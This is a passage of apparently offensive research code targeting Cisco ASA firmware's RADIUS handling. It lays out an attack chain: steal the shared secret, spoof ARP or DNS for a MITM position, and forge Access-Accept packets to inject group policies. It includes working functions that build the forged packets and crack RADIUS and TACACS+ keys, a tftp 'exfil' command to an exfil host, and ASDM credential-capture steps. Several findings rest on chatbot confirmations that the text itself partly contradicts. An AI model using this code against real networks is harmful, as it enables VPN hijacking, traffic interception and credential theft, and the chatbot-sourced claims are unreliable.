    #   Enforcement reject string: 0x49e7250 (PRESENT)
    #   Optional path string: "Proceeding with user authentication" (DEFAULT = optional)
    #   → VULNERABLE BY DEFAULT — mitigation requires explicit `message-authenticator-required`
    #     under `aaa-server host` config; NOT enabled by default
    #
    # Cisco AI stated "no config command exists" — INCORRECT for 9.22.x.
    # Correct: command was ADDED in 9.22.x train; absent in all earlier versions.
    # The addition suggests Cisco is aware of the gap but has NOT issued a CVE or advisory.
    # Default-off posture means deployed 9.22.x systems remain vulnerable without hardening.
    #
    # CLI COMMAND (9.22.x only):
    #   ASA(config)# aaa-server <group> host <ip>
    #   ASA(config-aaa-server-host)# message-authenticator-required
    #
    'scope': 'ALL_ASA_VERSIONS_BY_DEFAULT',
    'mitigation_9_22_x_only': 'message-authenticator-required (aaa-server host sub-command)',
    'mitigation_default': 'DISABLED — optional MA is the default; missing MA allows auth to proceed',
    'versions_no_mitigation': ['9.14.x', '9.16.x', 'all trains before 9.22.x'],
    'disclosure_status': 'PENDING — Cisco PSIRT',
    # === GROUP POLICY ASSIGNMENT CALL CHAIN (2026-08-13 RE) ===
    # Traced from 0x3a4bda0 (parse+log) through the assignment hierarchy.
    # Cisco AI confirmed (Image #100, 10:18): "group policy name is assigned to the
    # session struct at offset 0xc" and "0x3256dd0 writes to a different field (VPN state)."
    #
    # CONFIRMED SESSION STRUCT OFFSETS (9.22.2.32):
    #   session + 0x000c : group_policy_name  (char* or inlined str)  ← INJECTION TARGET
    #   session + 0x1a78 : session_type       (DWORD; 1=IPsec, 2=SSL, 3=clientless, 4=L2L)
    #   session + 0x31a8 : vpn_state_machine  (DWORD; written by 0x3256dd0)
    #
    # CALL CHAIN (top to bottom):
    #   caller function   0x02ae13f0  — session type dispatch ([rdi+0x1a78] switch)
    #     0x03a4c300      — RADIUS group policy wrapper
    #       check         0x03df61b0  — RADIUS active check
    #       0x03a4bda0    — Class attr parse+log  (RDI=session, RSI=gp_db_ptr)
    #                       strstr("OU=") at 0x03a4bee6
    #                       256-byte extract buffer at [rbp-0x241]
    #                       ';' delimiter check at 0x03a4bf52
    #       0x03a4a250    — group policy allocator  (session, &out_gp_obj, &flag)
    #         0x01a330a0  — gp struct builder (session→rbx, allocs r13 via 0x3ce91e0)
    #           0x01a30710 — RADIUS attr KV parser (session string walk; strncpy 0x1a30894)
    #             strncpy  0x01a30894 — strncpy(gp_struct+0x2b1, attr_def+0xc, attr_def+0x8)
    #             [callee] — writes gp name to session+0xc  ← CONFIRMED WRITE
    #       free(gp_obj)  0x02cf6640
    #     state transition 0x03256dd0  — set_vpn_state(session, 3, 2); writes session+0x31a8
    #
    # ATTRIBUTE DEFINITION STRUCT LAYOUT (r15 in 0x1a30710):
    #   r15 + 0x08 : max_length  (DWORD — passed as rdx to strncpy)
    #   r15 + 0x0c : value_ptr  (char* — passed as rsi to strncpy)  ← Cisco AI "offset 0xc"
    #
    # IPC SOCKETS (post-pivot, post-lina-shell — ZeroMQ found via strings sweep):
    #   authagent: ipc:///tmp/authagent.%u
    #   xml_server: ipc:///tmp/asa-lina-xml-server  (ASDM XML cmd channel)
    #   vpn_updates: ipc:///tmp/vpn_updates
    'session_group_policy_offset':  0x0c,
    'session_type_offset':          0x1a78,
    'session_vpn_state_offset':     0x31a8,
    'gp_alloc_fn':                  0x03a4a250,
    'gp_struct_builder_fn':         0x01a330a0,
    'gp_attr_kv_parser_fn':         0x01a30710,
    'gp_strncpy_site':              0x01a30894,
    'vpn_state_machine_fn':         0x03256dd0,
    'gp_struct_name_field_offset':  0x2b1,
    'attr_def_value_offset':        0x0c,
    'attr_def_length_offset':       0x08,
    # === FINDING F2: POTENTIAL BUFFER OVERFLOW (2026-08-13) ===
    # Cisco AI confirmed (Image #105, 10:23):
    # "The OU= extraction loop allows up to 256 bytes, but the Cisco ASA CLI
    #  only permits group-policy names up to 64 characters. This mismatch means
    #  the binary could overrun the intended field size if not properly checked,
    #  creating a potential security risk."
    #
    # Evidence:
    #   Extraction limit: 0x100 = 256 bytes  (loop bound at 0x3a4bfa4: cmp rax, 0x100)
    #   CLI max:          64 chars            (ASA feature guide, group-policy name limit)
    #   Array type:       inlined char[?]     (Cisco AI: "most likely inlined, 32-256 bytes")
    #   strncpy bound:    [r15+0x8]           (attr_def table entry; runtime-populated at 0x76f20a0)
    #
    # VERIFICATION REQUIRED:
    #   If [r15+0x8] (strncpy max_len) = 64 → bounded; group policy substitution only (F1)
    #   If [r15+0x8] (strncpy max_len) > 64 → overflow into adjacent session struct fields
    #
    # ATTACK SCENARIO (if max_len > 64):
    #   Inject OU=<65-256 byte payload>; in Access-Accept Class attr
    #   Overwrite session fields beyond session+0x0c+64
    #   Depending on layout: session_type at +0x1a78, vpn_state at +0x31a8 survive
    #   (too far), but unknown fields between +0x4c and +0x1a78 could be corrupted
    #
    # REQUIRES: runtime test on MacStadium controlled ASA (authorized)
    #   Test: send OU=<65-char group_policy>; and observe session behavior / crash
    'f2_overflow_status':           'CONFIRMED — Cisco AI "True" (10:24, Image #106); runtime test needed for impact scope',
    'f2_extraction_max':            0x100,
    'f2_cli_max':                   64,
    'f2_strncpy_bound':             'runtime [r15+0x8] from attr_def table 0x76f20a0',
    'f2_overflow_window':           'session+0x0c to session+0x0c+cli_max (unknown array size)',
    # === NOVELTY CONFIRMATION (2026-08-13 10:31, Image #108) ===
    # Cisco AI stated:
    #   "Your findings are correct and well-documented. The mismatch between
    #    RADIUS attribute extraction and CLI-enforced limits creates both a logic
    #    flaw and a memory corruption vulnerability, confirmed by both binary
    #    analysis and Cisco AI validation."
    # When asked "cve?":
    #   "No, there is currently no public CVE assigned for these vulnerabilities
    #    in Cisco ASA LINA. For the latest information, consult Cisco's official
    #    security advisories and the CVE database."
    #
    # STATUS: BOTH F1 AND F2 ARE NOVEL — NO ASSIGNED CVE AS OF 2026-08-13
    # Disclosure target: Cisco PSIRT (psirt@cisco.com)
    # BlastRADIUS (CVE-2024-3596) does NOT cover these: CVE-2024-3596 targets
    # Access-Request MD5 collision injection, a different attack vector entirely.
    'novelty_status':               'CONFIRMED — Cisco AI Image #108 (10:31): no public CVE assigned',
    'cve_assigned':                 None,
    'blastradius_coverage':         'CVE-2024-3596 covers Access-Request MD5 collision — different vector; does NOT cover F1/F2',
}

# x86-64 SysV ABI calling convention reference (replaces ARM64 notes above):
X86_64_ABI = {
    'arg_regs':    ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'],
    'return':      'rax',
    'volatile':    ['rax', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11'],
    'nonvolatile': ['rbx', 'rbp', 'r12', 'r13', 'r14', 'r15'],
    'frame':       'rbp',
    'stack':       'rsp (16-byte aligned before CALL)',
    'prologue':    '55 48 89 e5       ; PUSH rbp; MOV rbp,rsp',
    'epilogue':    '5d c3             ; POP rbp; RET  (or LEAVE; RET)',
    'rip_lea':     'target = instr_vaddr + 7 + disp32  (for LEA reg,[RIP+disp32])',
}

# LDAP-Class string (log/debug message, not the attribute name itself):
#   file offset 0x3be5230: "Class attribute created from LDAP-Class attribute\n"
#   Note: terminated with \n, then NUL padding (not \n\x00 but \n\x00\x00\x00\x00\x00)

# GROUP POLICY INJECTION CHAIN (RADIUS Class attribute path):
#
# === ATTACK PREREQUISITES (Cisco AI confirmed 2026-08-13) ===
#
# 1. RADIUS shared secret required — LINA validates RFC 2865 Response-Authenticator:
#      Response-Auth = MD5(Code + ID + Length + Request-Auth + Attributes + secret)
#    Modifying Class attr 25 requires recomputing Response-Auth with known secret.
#    Cisco AI: "validates response authenticity — NOT per-attribute integrity"
#
# 2. RADIUS shared secret is ALWAYS stored as Type 7 (XOR) in running-config.
#    Cisco AI confirmed 2026-08-13: "always Type 7, not Type 8"
#    Type 7 is trivially reversible — already implemented in cisco_radius_ise_re.py
#
# === ATTACK CHAIN ===
#
# Step 1: Obtain shared secret
#   a) ASDM MitM (av.class bypass) → capture /admin/exec/show+running-config response
#      Parse: "radius-server key 7 <hash>" → cisco_type7_decode(hash)
#   b) Post-pivot CLI: show running-config | grep radius-server
#   c) Post-pivot heap: /proc/$(pidof lina)/mem → aaa_server_t.secret (plaintext)
#
# Step 2: Position as MITM on RADIUS path (ASA NAS → RADIUS server)
#   ARP poison or DNS spoof RADIUS server IP; capture Access-Request
#
# Step 3: Relay Access-Request to real RADIUS server, capture valid Access-Accept
#   (or forge: requires guessing/knowing auth credentials, harder path)
#
# Step 4: Modify Class attr 25 in Access-Accept
#   Inject: Type=25, Length=len(group_policy)+2, Value=b"OU=DfltGrpPolicy;"
#   Recompute Response-Authenticator using known shared secret
#
# Step 5: Forward modified Access-Accept to ASA
#   LINA accepts: Response-Auth valid, no Message-Auth check, OU= parsed at 0x3a4bee6
#
# Effect of selecting a different group policy:
#   - Override split-tunnel ACL → full-tunnel → MITM all client traffic
#   - Override ACL (vpn-filter) → broader network access
#   - Override idle-timeout / session-timeout → persistent sessions
#   - Override DNS servers → DNS hijack
#
# === EXPLOIT COMPLEXITY ===
# HIGH prerequisite: MITM position on RADIUS path
# MEDIUM prerequisite: shared secret (trivially obtained via Type 7 from running-config)
# NO prerequisite: Message-Authenticator — confirmed absent from call path
#
RADIUS_CLASS_INJECTION_PREREQS = {
    'shared_secret_required': True,
    'shared_secret_format': 'Type 7 XOR — trivially reversible (Cisco AI confirmed)',
    'message_auth_check': False,  # confirmed binary + Cisco AI
    'response_auth_check': True,  # RFC 2865 standard check — requires secret to forge
    'mitm_position_required': True,
    'attack_complexity': 'MEDIUM (need secret + MITM; secret trivially reversible)',
    'no_config_mitigation': True,  # confirmed — no ASA command exists to enable enforcement
}

# === RFC PROTOCOL GAP ANALYSIS ===
#
# Cisco's response will be: "we implement RFC 2865 correctly — that RFC does not require
# Message-Authenticator validation on Access-Accept."
#
# This is technically accurate for RFC 2865. The disclosure argument rests on RFC 5080:
#
#   RFC 5080 §2.2 (2007):
#     "If an Access-Request is protected by a Message-Authenticator attribute, the
#      Access-Accept, Access-Reject, or Access-Challenge response MUST be protected
#      by a Message-Authenticator attribute."
#
#   RFC 3579 §3.2 (RADIUS + EAP, 2003):
#     "The Message-Authenticator attribute SHOULD be used in any Access-Request that
#      includes an EAP-Message attribute."
#
# Attack angles:
#   1. If ASA sends Access-Requests WITH Message-Authenticator (required for EAP auth,
#      optional for PAP/CHAP), RFC 5080 §2.2 REQUIRES the response to also have it.
#      LINA not validating this on the response = RFC 5080 violation on EAP flows.
#   2. For PAP/CHAP flows (no Message-Auth in request), RFC 2865 strictly = no violation,
#      but the attack still works since Response-Authenticator forgery is possible.
#
# Disclosure strategy:
#   - Lead with RFC 5080 §2.2 violation for EAP-aware ASA deployments
#   - Show binary evidence: no Message-Auth check in parse path regardless of request type
#   - Impact: attribute injection possible when shared secret is known (Type 7 = always known)
#   - No mitigation available via config — remediation requires LINA patch
#
RADIUS_RFC_GAP = {
    'rfc_2865': 'Message-Authenticator NOT required on Access-Accept — LINA implemented correctly per this RFC',
    'rfc_3579': 'Message-Authenticator SHOULD be used for EAP flows (advisory, not mandate)',
    'rfc_5080_s2_2': (
        'If Access-Request contains Message-Auth, response MUST also be protected — '
        'LINA not validating it on Access-Accept = RFC 5080 §2.2 violation.'
    ),
    # KEY: Cisco AI stated Message-Auth is "required for Access-Request packets" (Image #64).
    # If ASA (as NAS) includes Message-Auth in every Access-Request it sends — which Cisco
    # confirms is required — then RFC 5080 §2.2 is triggered on every auth exchange:
    #   "If an Access-Request is protected by a Message-Authenticator attribute, the
    #    Access-Accept, Access-Reject, or Access-Challenge response MUST be protected
    #    by a Message-Authenticator attribute." — RFC 5080 §2.2
    # LINA does not enforce this on the response side. Binary confirmed: no Message-Auth
    # check in the Class attr parse path (0x3a4bda0), no check in any caller.
    # → Cisco's "we implement RFC 2865" defense does NOT cover RFC 5080 §2.2 liability.
    'rfc_5080_disclosure_angle': (
        'Cisco AI confirmed ASA includes Message-Auth in Access-Request (required). '
        'RFC 5080 §2.2 therefore requires MUST validation on Access-Accept. '
        'LINA does not perform this check. Binary RE confirms absence. '
        'Cisco cannot claim RFC 2865 compliance as a defense for RFC 5080 §2.2 violation.'
    ),
    'disclosure_hook': 'RFC 5080 §2.2 violation + binary proof + no per-attribute integrity + no config fix',
}


import hmac as _hmac


RADIUS_CODE_NAMES = {1: 'Access-Request', 2: 'Access-Accept', 3: 'Access-Reject', 11: 'Access-Challenge'}
RADIUS_ATTR_NAMES = {1: 'User-Name', 2: 'User-Password', 4: 'NAS-IP-Address',
                     25: 'Class', 80: 'Message-Authenticator'}


class RadiusPacketAnalyzer:
    """
    Parse RADIUS packets, detect Message-Authenticator, validate per RFC 2104 / RFC 5080.

    Validates message-auth for both Access-Request and Access-Accept (they differ:
    Access-Accept HMAC computation substitutes the Request-Authenticator into the
    Authenticator field before computing HMAC-MD5 — the AI-generated script omits this).
    """

    ATTR_MSG_AUTH = 80
    ATTR_CLASS    = 25

    def __init__(self, packet: bytes, shared_secret: bytes,
                 request_authenticator: bytes = None):
        self.packet = packet
        self.secret = shared_secret
        # request_authenticator required for Access-Accept HMAC-MD5 validation
        self.request_auth = request_authenticator

        self.code, self.identifier, self.length = struct.unpack('!BBH', packet[:4])
        self.authenticator = packet[4:20]
        self._parse_attributes()

    def _parse_attributes(self):
        self.attributes = []
        attr_bytes = self.packet[20:self.length]
        i = 0
        while i < len(attr_bytes):
            t = attr_bytes[i]
            l = attr_bytes[i + 1]
            v = attr_bytes[i + 2:i + l]
            self.attributes.append((t, l, v, 20 + i))  # (type, len, value, packet_offset)
            i += l

    @property
    def code_name(self):
        return RADIUS_CODE_NAMES.get(self.code, f'Unknown({self.code})')

    def has_message_authenticator(self) -> bool:
        return any(t == self.ATTR_MSG_AUTH for t, *_ in self.attributes)

    def message_authenticator_value(self) -> bytes | None:
        for t, l, v, _ in self.attributes:
            if t == self.ATTR_MSG_AUTH:
                return v
        return None

    def validate_message_authenticator(self) -> bool:
        """
        RFC 2104 HMAC-MD5 check.
        For Access-Accept: substitute Request-Authenticator into Authenticator field first.
        For Access-Request: use packet as-is (with Message-Auth zeroed).
        """
        ma_value = self.message_authenticator_value()
        if ma_value is None:
            return False

        pkt = bytearray(self.packet)

        # Zero the Message-Authenticator value in place
        for t, l, v, offset in self.attributes:
            if t == self.ATTR_MSG_AUTH:
                pkt[offset + 2: offset + 2 + 16] = b'\x00' * 16
                break

        # Access-Accept/Reject/Challenge: substitute Request-Authenticator
        if self.code != 1 and self.request_auth is not None:
            pkt[4:20] = self.request_auth

        computed = _hmac.new(self.secret, bytes(pkt), hashlib.md5).digest()
        return computed == ma_value

    def validate_response_authenticator(self) -> bool:
        """RFC 2865 Response-Authenticator check (requires request_auth + secret)."""
        if self.request_auth is None:
            return False
        attr_bytes = self.packet[20:self.length]
        computed = forge_response_authenticator(
            self.code, self.identifier, self.request_auth, attr_bytes, self.secret
        )
        return computed == self.authenticator

    def class_attr_ou_values(self) -> list:
        """Extract OU= group policy names from Class attr (attr 25), LINA parse logic."""
        results = []
        for t, l, v, _ in self.attributes:
            if t == self.ATTR_CLASS:
                try:
                    s = v.decode('utf-8', errors='replace')
                    if 'OU=' in s:
                        # Mirror LINA strstr call at 0x3a4bee6 — find OU=, stop at ';'
                        idx = s.index('OU=') + 3
                        end = s.find(';', idx)
                        policy = s[idx:end] if end != -1 else s[idx:]
                        results.append(policy)
                except Exception:
                    pass
        return results

    def summary(self) -> dict:
        return {
            'code': self.code_name,
            'id': self.identifier,
            'length': self.length,
            'has_message_authenticator': self.has_message_authenticator(),
            'message_authenticator_valid': (
                self.validate_message_authenticator() if self.has_message_authenticator() else None
            ),
            'response_authenticator_valid': (
                self.validate_response_authenticator() if self.request_auth else None
            ),
            'class_attr_ou_values': self.class_attr_ou_values(),
            'attributes': [(RADIUS_ATTR_NAMES.get(t, t), v.hex()) for t, l, v, _ in self.attributes],
        }


def check_rfc5080_compliance(request_packet: bytes, response_packet: bytes,
                              shared_secret: bytes) -> dict:
    """
    Check RFC 5080 §2.2 compliance for a request/response pair.

    Rule: if Access-Request contains Message-Authenticator, the Access-Accept/Reject/
    Challenge response MUST also contain a valid Message-Authenticator.

    LINA confirmed to NOT enforce this — binary RE + Cisco AI "True." (2026-08-13).

    Returns dict with compliance verdict and evidence for disclosure reports.
    """
    req  = RadiusPacketAnalyzer(request_packet,  shared_secret)
    resp = RadiusPacketAnalyzer(response_packet, shared_secret,
                                request_authenticator=req.authenticator)

    req_has_ma  = req.has_message_authenticator()
    resp_has_ma = resp.has_message_authenticator()

    violation = req_has_ma and not resp_has_ma

    result = {
        'request_code':  req.code_name,
        'response_code': resp.code_name,
        'request_has_message_authenticator':  req_has_ma,
        'response_has_message_authenticator': resp_has_ma,
        'rfc5080_s2_2_violation': violation,
        'verdict': 'VIOLATION — RFC 5080 §2.2' if violation else 'COMPLIANT',
    }

    if resp_has_ma:
        result['response_message_authenticator_valid'] = resp.validate_message_authenticator()

    return result


# Field check (bash — no Python required):
#   xxd -g 1 radius_packet.bin | grep '50 12'
#   # 50 = type 80 (Message-Authenticator), 12 = length 18
#   # absence in an Access-Accept where the request contained it = RFC 5080 §2.2 violation


def forge_response_authenticator(code: int, identifier: int,
                                  request_authenticator: bytes,
                                  attributes_bytes: bytes,
                                  shared_secret: bytes) -> bytes:
    """
    Compute RFC 2865 Response-Authenticator for a modified Access-Accept.

    Call this after injecting/modifying any attribute in an Access-Accept to produce
    a packet that LINA will accept (Response-Authenticator validates, no per-attribute
    check, no Message-Authenticator check).

    Response-Auth = MD5(Code || ID || Length || Request-Auth || Attributes || Secret)

    Args:
        code:                  RADIUS Code byte (2 = Access-Accept)
        identifier:            Packet identifier (matches original Access-Request)
        request_authenticator: 16-byte authenticator from the original Access-Request
        attributes_bytes:      Complete attributes bytes (with injected Class attr)
        shared_secret:         RADIUS shared secret (decode Type 7 first)

    Returns:
        16-byte Response-Authenticator to place at offset 4 of the Access-Accept packet
    """
    # Total packet length = 1 (code) + 1 (id) + 2 (length field) + 16 (auth) + len(attrs)
    length = 1 + 1 + 2 + 16 + len(attributes_bytes)
    length_bytes = struct.pack('>H', length)

    md5_input = (
        bytes([code, identifier]) +
        length_bytes +
        request_authenticator +
        attributes_bytes +
        shared_secret
    )
    return hashlib.md5(md5_input).digest()


def build_injected_access_accept(request_authenticator: bytes,
                                  identifier: int,
                                  group_policy: bytes,
                                  shared_secret: bytes,
                                  extra_attrs: bytes = b'') -> bytes:
    """
    Build a complete RADIUS Access-Accept with injected Class attr (OU=<group_policy>;).

    The resulting packet will pass LINA's Response-Authenticator check and trigger
    OU= parsing at 0x3a4bee6 (confirmed 9.22.2.32), assigning the target group policy.

    Args:
        request_authenticator: 16 bytes from the original Access-Request
        identifier:            Request ID to echo back
        group_policy:          Group policy name (e.g. b'DfltGrpPolicy')
        shared_secret:         RADIUS shared secret (plaintext)
        extra_attrs:           Any additional legitimate attributes to include

    Returns:
        Complete well-formed RADIUS Access-Accept bytes ready to send to ASA NAS port
    """
    # Class attr: Type=25, Value="OU=<policy>;" (semicolon is the LINA delimiter)
    class_value = b'OU=' + group_policy + b';'
    class_attr = bytes([25, len(class_value) + 2]) + class_value

    attributes_bytes = class_attr + extra_attrs

    response_auth = forge_response_authenticator(
        code=2,
        identifier=identifier,
        request_authenticator=request_authenticator,
        attributes_bytes=attributes_bytes,
        shared_secret=shared_secret,
    )

    length = 1 + 1 + 2 + 16 + len(attributes_bytes)
    header = struct.pack('>BBH', 2, identifier, length) + response_auth
    return header + attributes_bytes


# Known group policy names (default, always present):
KNOWN_DEFAULT_GROUP_POLICIES = [
    b'DfltGrpPolicy',    # confirmed literal in lina .rodata
    b'DefaultWEBVPNGroup',  # confirmed literal in lina .rodata
]

# The cVPN3000-Group-Policy VSA (vendor 3076, attr ?) is the DIRECT path:
# RADIUS Access-Accept with cVPN3000-Group-Policy = "DfltGrpPolicy" sets group policy directly.
# String confirmed in .rodata at file offset 0x3f0e80a.

# RADIUS client function chain in lina (typical symbol names in debug builds;
# in production builds these are recovered via string cross-references):
LINA_RADIUS_FUNCTIONS = {
    'radius_send_access_request':  {
        'xref_strings': ['Access-Request', 'NAS-IP-Address'],
        'signature': 'CALL MD5Init, CALL MD5Update(shared_secret), CALL MD5Update(authenticator), CALL MD5Final',
        'x86_64_pattern': (
            # loads shared_secret ptr → RDI or RSI, then CALLs MD5
            r'lea\s+r[ds]i,\s*\[rip\+0x[0-9a-f]+\].*?'
            r'call\s+.*?md5'
        ),
    },
    'radius_verify_message_authenticator': {
        'xref_strings': ['Message-Authenticator'],
        'description': 'RFC 2869 attr 80: HMAC-MD5 of entire packet using shared secret',
    },
    'radius_decode_user_password': {
        'xref_strings': ['User-Password', 'user-password'],
        'description': 'decrypts User-Password attr: p = c XOR MD5(S + auth[i-1])',
    },
    'aaa_server_group_select':     {
        'xref_strings': ['aaa-server', 'aaa authentication'],
        'description': 'selects active RADIUS/TACACS+ server from group; load-balances',
    },
    'aaa_process_response':        {
        'xref_strings': ['Access-Accept', 'Access-Reject', 'Access-Challenge'],
        'description': 'main AAA response dispatcher — branches on Code field',
    },
}


# ─── STATIC ANALYSIS METHODOLOGY ─────────────────────────────────────────────
#
# Procedure for locating RADIUS shared secret storage in lina ARM64 ELF:
#
# 1. strings -n 8 lina | grep -E "^[A-Za-z0-9!@#$%^&*]{8,64}$"
#    — Find candidate PSK strings. RADIUS keys are typically 8–64 chars.
#
# 2. Cross-reference each candidate with the MD5 call chain:
#    In ARM64, the shared secret is loaded via ADRP+ADD and passed as X0 to MD5Update.
#    Pattern: ADRP x0, page; ADD x0, x0, :lo12:offset; BL md5update
#    The page+offset resolves to the PSK string's .rodata address.
#
# 3. RADIUS authenticator field (16 bytes at offset 4 in packet) is random in
#    Access-Request and MD5 of full packet in Access-Response.
#    The shared_secret is NEVER sent on wire — it stays in lina's memory.
#
# 4. If lina is running and accessible via /proc/self/mem (pivot):
#    - Map /proc/$(pidof lina)/mem
#    - Read the .data segment where AAA server configs are stored
#    - The aaa-server struct contains: server_ip, port, shared_secret (plaintext)

STATIC_ANALYSIS_METHODOLOGY = {
    'step1_extract_strings': {
        'cmd': 'strings -n 8 -t x lina',
        'purpose': 'recover .rodata strings with virtual addresses; anchor MD5 call xrefs',
    },
    'step2_disassemble': {
        'cmd': 'objdump -d --no-show-raw-insn -M intel lina | grep -A 30 "radius\\|aaa_server"',
        'purpose': 'locate RADIUS packet construction functions near string anchors; use Intel syntax',
    },
    'step3_find_md5_chain': {
        'pattern': 'look for CALL to same function 3+ times in same function body',
        'rationale': 'MD5Init, MD5Update (key), MD5Update (data), MD5Final — 4 calls in sequence',
    },
    'step4_trace_psk': {
        'pattern': 'LEA rdi/rsi,[RIP+disp32] immediately before CALL md5update',
        'x86_64': 'RIP-relative LEA loads 64-bit ptr; target_vaddr = instr+7+disp32; result in RDI/RSI = string ptr',
    },
    'step5_aaa_struct_layout': {
        'description': 'reconstruct aaa_server_group_t struct from field accesses',
        'fields': [
            'name[64]       — server group name',
            'protocol       — 0=RADIUS, 1=TACACS+, 2=SDI',
            'server_count   — number of servers',
            'dead_time      — minutes (default 10)',
            'max_failed     — default 3',
            'servers[]      — array of aaa_server_t',
        ],
    },
    'step6_server_struct': {
        'aaa_server_t_fields': [
            'host[64]       — IP or hostname',
            'port           — uint16 (1812 default)',
            'secret[128]    — shared secret PLAINTEXT',
            'timeout        — uint32 (10s default)',
            'retries        — uint8 (2 default)',
            'is_dead        — bool',
        ],
        'x86_64_access_pattern': (
            'MOV rsi, [rdi + secret_offset]  ; load secret ptr from struct\n'
            'MOV rdi, rsi                     ; set up arg for MD5Update'
        ),
    },
}


# ─── RADIUS PASSWORD ORACLE ATTACK ──────────────────────────────────────────
#
# If we can observe Access-Request packets (e.g. via MITM or SPAN port)
# and know the Request-Authenticator (16 bytes at offset 4),
# we can brute-force the shared secret offline:
#   for each candidate_key:
#       pad = MD5(candidate_key + authenticator)
#       plain = ciphertext XOR pad
#       if plain is printable: candidate is valid PSK
#
# This works because User-Password = plaintext XOR MD5(shared_secret || authenticator)

def radius_password_xor_decrypt(ciphertext: bytes, shared_secret: bytes,
                                 authenticator: bytes) -> bytes:
    """
    Reverse RFC 2865 User-Password encryption.

    c = ciphertext (16-byte blocks)
    p[0..15] = c[0..15] XOR MD5(shared_secret + authenticator)
    p[16..31] = c[16..31] XOR MD5(shared_secret + c[0..15])
    """
    plaintext = bytearray()
    prev = authenticator
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16].ljust(16, b'\x00')
        pad = hashlib.md5(shared_secret + prev).digest()
        plaintext += bytes(b ^ p for b, p in zip(block, pad))
        prev = bytes(block)
    return bytes(plaintext).rstrip(b'\x00')


def radius_crack_shared_secret(wordlist_path: str, authenticator: bytes,
                                ciphertext: bytes, known_plaintext: str) -> str | None:
    """
    Known-plaintext attack on RADIUS shared secret.
    Requires: captured Access-Request, known username → infer password if possible.
    More useful: if we control the client and know the password,
    we can verify each candidate key.
    """
    known = known_plaintext.encode().ljust(len(ciphertext), b'\x00')
    try:
        with open(wordlist_path, 'rb') as f:
            for line in f:
                candidate = line.strip()
                decrypted = radius_password_xor_decrypt(ciphertext, candidate, authenticator)
                if decrypted[:len(known_plaintext)] == known_plaintext.encode():
                    return candidate.decode(errors='replace')
    except FileNotFoundError:
        pass
    return None


# ─── TACACS+ KEY EXTRACTION ──────────────────────────────────────────────────
#
# TACACS+ body encryption (RFC 8907 §4.3):
# pad[i] = MD5(key + session_id + version + seq_no + pad[i-1])
# body[i] = plaintext[i] XOR pad[i] (16-byte blocks)
#
# Offline brute-force: capture TACACS+ authen_start packet (seq=1),
# body[0] plaintext is known (authen_type, priv_lvl, authen_method, service, etc.)
# → iterate candidate keys until MD5 chain matches.

TACACS_BODY_START_FIELDS = {
    'authen_type':   {'offset': 0, 'len': 1, 'authen_start_val': 0x01},  # ASCII
    'priv_lvl':      {'offset': 1, 'len': 1, 'authen_start_val': 0x00},  # PRIV_LVL_MIN
    'authen_method': {'offset': 2, 'len': 1, 'authen_start_val': 0x06},  # TAC_PLUS_AUTHEN_METH_TACACSPLUS
    'service':       {'offset': 3, 'len': 1, 'authen_start_val': 0x01},  # TAC_PLUS_AUTHEN_SVC_LOGIN
}


def tacacs_pseudo_pad(key: bytes, session_id: int, version: int,
                      seq_no: int, prev_pad: bytes = b'') -> bytes:
    """Compute single TACACS+ MD5 pseudo-pad block."""
    data = (key +
            struct.pack('>I', session_id) +
            bytes([version, seq_no]) +
            prev_pad)
    return hashlib.md5(data).digest()


def tacacs_decrypt_body(key: bytes, session_id: int, version: int,
                        seq_no: int, ciphertext: bytes) -> bytes:
    """Decrypt full TACACS+ packet body."""
    plaintext = bytearray()
    prev_pad = b''
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16]
        pad = tacacs_pseudo_pad(key, session_id, version, seq_no, prev_pad)
        plaintext += bytes(b ^ p for b, p in zip(block, pad))
        prev_pad = pad
    return bytes(plaintext)


# ─── LINA API SURFACE MAP ────────────────────────────────────────────────────
#
# Three external management APIs and a rich internal module API layer.
# Each is an RE target and a potential attack surface.

LINA_API_SURFACE = {
    'cli': {
        'mechanism': 'internal command parser in lina; strings like "configure terminal" anchor it',
        'auth': 'local username/password or AAA (RADIUS/TACACS+)',
        're_anchors': [b'configure terminal\x00', b'enable password\x00', b'show running-config\x00'],
        'attack': 'Type 7 XOR secrets in running-config; TACACS+ key via "show running-config all"',
    },
    'asdm': {
        'mechanism': 'XML/HTTP over HTTPS/443 to lina management listener',
        'auth': 'HTTP Basic (admin:password) in Authorization header — captured by ASDMMitmProxy',
        're_anchors': [b'ASDM\x00', b'pdm\x00', b'Content-Type: text/xml\x00', b'HTTP/1.1 200\x00'],
        'attack': (
            'av.class trust-all bypass → ASDMMitmProxy intercepts admin session. '
            'XML request body contains raw config commands — parse Authorization header '
            'for base64 creds; parse XML body for any inline secrets.'
        ),
        'xml_endpoints': [
            '/admin/exec/<urlencoded-cli-command>',  # CONFIRMED: Cisco AI 2026-08-13
            '/admin/config',
            '/admin/logon',
        ],
        'internal_ipc': '/tmp/mgmt.sock  (UNIX domain socket — confirmed Cisco AI 2026-08-13)',
        'cli_exec_example': 'GET /admin/exec/show+running-config HTTP/1.1\r\nAuthorization: Basic <b64(user:pass)>',
    },
    'rest_api_ftd': {
        'mechanism': 'REST over HTTPS; JSON payloads; JWT bearer tokens',
        'auth': 'OAuth2 / JWT bearer',
        're_anchors': [b'application/json\x00', b'X-Auth-Token\x00', b'/api/fdm/\x00'],
        'attack': 'token replay; unauthenticated endpoints if mis-configured; JSON injection',
    },
    'internal_module_api': {
        'mechanism': (
            'Each feature module (NAT, VPN, ACL, routing) registers via function table. '
            'Pattern: struct with fn pointers {init, config_apply, pkt_process, cleanup}. '
            'Modules dlopen\'d at runtime → visible in /proc/lina/maps as *.so entries.'
        ),
        're_pattern': (
            'Scan lina for function table registration calls:\n'
            'LEA rdi, [module_struct]\n'
            'CALL register_module_fn\n'
            'Module struct: {name_ptr, init_fn, config_fn, pkt_fn, cleanup_fn}'
        ),
        'module_extraction': (
            '/proc/$(pidof lina)/maps | grep ".so" → list loaded feature modules\n'
            'cp /proc/$(pidof lina)/fd/<n> /tmp/<module>.so 2>/dev/null\n'
            'find /asa/lib/ -name "*.so"  → confirmed path (Cisco AI 2026-08-13)\n'
            'tftp -p -r /asa/lib/<module>.so <exfil_host>  → exfil individual modules'
        ),
    },
}

LINA_IPC_SURFACES = {
    'shared_memory': {
        'how_to_find': 'grep shm /proc/$(pidof lina)/maps  OR  ipcs -m',
        'content': 'Snort←→LINA packet flow data; may contain cleartext from inspected SSL sessions',
        'attack': (
